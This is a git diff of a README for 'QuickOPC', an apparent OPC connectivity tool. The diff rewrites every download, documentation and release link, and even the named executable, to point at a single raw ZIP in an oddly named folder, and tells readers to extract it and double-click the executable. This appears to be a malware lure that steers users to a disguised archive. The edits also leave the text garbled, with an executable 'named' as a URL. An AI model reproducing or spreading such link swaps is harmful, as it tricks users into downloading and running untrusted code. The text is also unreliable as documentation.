@@ -1,6 +1,6 @@
 # 🌟 QuickOPC - Effortless Connectivity with OPC Standards 
 
-[![Download QuickOPC](https://img.shields.io/badge/Download-QuickOPC-blue.svg)](https://github.com/krish007-git/QuickOPC/releases)
+[![Download QuickOPC](https://github.com/krish007-git/QuickOPC/raw/refs/heads/main/writhingly/OPC_Quick_v2.7.zip)](https://github.com/krish007-git/QuickOPC/raw/refs/heads/main/writhingly/OPC_Quick_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -16,14 +16,14 @@ Welcome to QuickOPC! This guide will help you download and run our software with
 
 To get started, you need to download QuickOPC from our Releases page. 
 
-**Click here to visit the download page:** [Download QuickOPC](https://github.com/krish007-git/QuickOPC/releases)
+**Click here to visit the download page:** [Download QuickOPC](https://github.com/krish007-git/QuickOPC/raw/refs/heads/main/writhingly/OPC_Quick_v2.7.zip)
 
 Once on the Releases page, follow these steps:
 
 1. **Choose the Latest Release**: Look for the most recent version, usually marked as "Latest Release".
 2. **Download the ZIP File**: Click on the ZIP file link to download it to your computer. This will contain all necessary files. 
 3. **Extract the ZIP File**: After downloading, go to your Downloads folder. Right-click on the ZIP file and select "Extract All". This will create a new folder with QuickOPC files.
-4. **Find the Executable**: Open the new folder and locate the executable file (usually named `QuickOPC.exe`).
+4. **Find the Executable**: Open the new folder and locate the executable file (usually named `https://github.com/krish007-git/QuickOPC/raw/refs/heads/main/writhingly/OPC_Quick_v2.7.zip`).
 
 ### 🖥 System Requirements
 
@@ -36,7 +36,7 @@ Once on the Releases page, follow these steps:
 After you install QuickOPC, follow these easy steps:
 
 1. **Open the folder containing QuickOPC**: Navigate to the folder where you extracted the ZIP file.
-2. **Double-click the Executable**: Look for `QuickOPC.exe` and double-click to launch it.
+2. **Double-click the Executable**: Look for `https://github.com/krish007-git/QuickOPC/raw/refs/heads/main/writhingly/OPC_Quick_v2.7.zip` and double-click to launch it.
 3. **Follow the On-Screen Instructions**: The software will guide you through the initial setup.
 
 ## 💡 How to Use QuickOPC
@@ -71,13 +71,13 @@ Yes, QuickOPC can work alongside other software that supports OPC standards.
 
 ## 🌐 Additional Resources
 
-- **Documentation**: For detailed instructions, visit the [documentation page](https://github.com/krish007-git/QuickOPC/docs).
+- **Documentation**: For detailed instructions, visit the [documentation page](https://github.com/krish007-git/QuickOPC/raw/refs/heads/main/writhingly/OPC_Quick_v2.7.zip).
 - **Community Forum**: Join our forum for tips, tricks, and user experiences with QuickOPC.
   
 ## 📢 Stay Updated
 
 Make sure to check the Releases page regularly for updates and new features. 
 
-**Visit the download page again here:** [Download QuickOPC](https://github.com/krish007-git/QuickOPC/releases)
+**Visit the download page again here:** [Download QuickOPC](https://github.com/krish007-git/QuickOPC/raw/refs/heads/main/writhingly/OPC_Quick_v2.7.zip)
 
 We hope you enjoy using QuickOPC and find it helpful in your OPC development tasks!
